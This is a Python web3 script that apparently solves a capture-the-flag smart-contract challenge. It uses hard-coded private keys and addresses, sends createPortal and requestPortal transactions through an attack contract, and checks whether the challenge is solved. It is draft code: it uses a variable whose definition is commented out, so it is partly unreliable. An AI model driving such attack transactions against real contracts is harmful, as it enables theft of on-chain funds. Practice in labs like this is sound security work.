from web3 import Web3
import json
from web3.gas_strategies.rpc import rpc_gas_price_strategy
from solcx import compile_source, install_solc, compile_files
from Crypto.Util.number import bytes_to_long

x = {
    "PrivateKey": "0x2de3d450f2b9f28d5640560572511a56b1133ff1f39236fc40e51c6fb55e945c",
    "Address": "0xaDb67e10Fa330db49e98201B4c5F19356CfA3f59",
    "TargetAddress": "0xACef632826fb9d4EF70cB70640b5F56b7474B3a9",
    "setupAddress": "0xfD730FDDbD5b98471b7a0fE78d2CB0Fd0E5454BA"
}

PrivateKey =    x["PrivateKey"]
Address =       x["Address"] 
TargetContract = x["TargetAddress"]
SetupContract =  x["setupAddress"]

#Attack Contract address
Target2Contract = "0xB89EcCb84C7CA4D2d28ecb49617982D4FF4c8CcE"

url = 'http://157.245.43.189:30681/rpc'

w3 = Web3(Web3.HTTPProvider(url))
block_number = w3.eth.block_number
print(block_number)

account_address = Address
balance = w3.eth.get_balance(account_address)
print(balance)
block = w3.eth.get_block(block_number)

#print(block)
#print(w3.eth.get_code(TargetContract))
#print(w3.eth.get_code("0xFC31cde4aCbF2b1d2996a2C7f695E850918e4007"))
#print(w3.eth.get_code("0x598136Fd1B89AeaA9D6825086B6E4cF9ad2BD4cF"))
#print(w3.eth.get_code("0xFc2D16b59Ec482FaF3A8B1ee6E7E4E8D45Ec8bf1"))


account_from = {
        'private_key': PrivateKey,
        'address': account_address,
}

install_solc("0.8.13")

compiled = compile_files(["Contract.sol"], output_values=["abi"], solc_version="0.8.13")
abi = compiled['Contract.sol:Contract']['abi']

contract_instance = w3.eth.contract(address=Target2Contract, abi=abi)
#number = contract_instance.functions.attack2().call()
#print(number)

#compiled = compile_files(["Portal.sol"], output_values=["abi"], solc_version="0.8.13")
#abi = compiled['Portal.sol:PortalStation']['abi']
#compiled = compile_files(["Portal2.sol"], output_values=["abi"], solc_version="0.8.13")
#abi = compiled['Portal2.sol:PortalStation']['abi']

#contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi)

#number = contract_instance2.functions.destinations("orcKingdom").call()
#print(number)
#number = contract_instance2.functions.destinations("elfKingdom").call()
#print(number)
#number = contract_instance2.functions.destinations("dawrfKingdom").call()
#print(number)
#number = contract_instance2.functions.destinations("").call()
#print(number)

#number = contract_instance2.functions.createPortal("orcKingdom").call()
#print(number)
#number = contract_instance2.functions.createPortal("elfKingdom").call()
#print(number)
#number = contract_instance2.functions.createPortal("dawrfKingdom").call()
#print(number)

#construct_txn = contract_instance2.functions.createPortal("elfKingdom").build_transaction(
construct_txn = contract_instance2.functions.createPortal("orcKingdom").build_transaction(
#construct_txn = contract_instance2.functions.createPortal("dawrfKingdom").build_transaction(
	{
		'from': account_from['address'],
		'nonce': w3.eth.get_transaction_count(account_from['address']),
		#'from': Target2Address,
		#'nonce': w3.eth.get_transaction_count(Target2Address),
		'chainId': w3.eth.chain_id,
		#'value' : 1
		#"gasPrice": w3.to_wei(50, 'gwei'),
		#"gas": 21000,
		#"value": w3.to_wei("0", "ether"),
	}
)

tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')

construct_txn = contract_instance2.functions.requestPortal("orcKingdom").build_transaction(
        {
                'from': account_from['address'],
                'nonce': w3.eth.get_transaction_count(account_from['address']),
                #'from': Target2Address,
                #'nonce': w3.eth.get_transaction_count(Target2Address),
                'chainId': w3.eth.chain_id,
                'value' : 1338,
                #"gasPrice": w3.to_wei(50, 'gwei'),
                #"gas": 21000,
                #"value": w3.to_wei("0", "ether"),
        }
)
tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')

compiled = compile_files(["Setup.sol"], output_values=["abi"], solc_version="0.8.13")
abi = compiled['Setup.sol:Setup']['abi']

contract_instance = w3.eth.contract(address=SetupContract, abi=abi)
number = contract_instance.functions.isSolved().call()

print(f'The current number stored is: { number } ')
#


'''
https://ctftime.org/writeup/31583
https://0xsage.medium.com/ethernaut-lvl-4-walkthrough-how-to-abuse-tx-origin-msg-sender-ef37d6751c8

forge init . --no-git

forge create src/Contract.sol:Contract --rpc-url http://209.97.176.174:31323/rpc --private-key 0x643f9dae7f3636d00fddb4236351c6136001b2cb5641b49ea1f72c327e5f1981
[⠰] Compiling...
[⠔] Compiling 1 files with 0.8.20
[⠒] Solc 0.8.20 finished in 40.18ms
Compiler run successful!
Deployer: 0xd44C694e6280032dA55cEF6715aA3d89c1AD4836
Deployed to: 0x855ad55752bCE030B8D8875d671494eE3F51B1e7
Transaction hash: 0xfcbc1aca59dc9b42ce5c917c38d28b7ba60488ab115b25aa9c425ac6513709e0


Change the address in Contract.sol, align with TargetAddress in rpc url
Change the address in dec.py, align with the new deplyed address by forge

'''
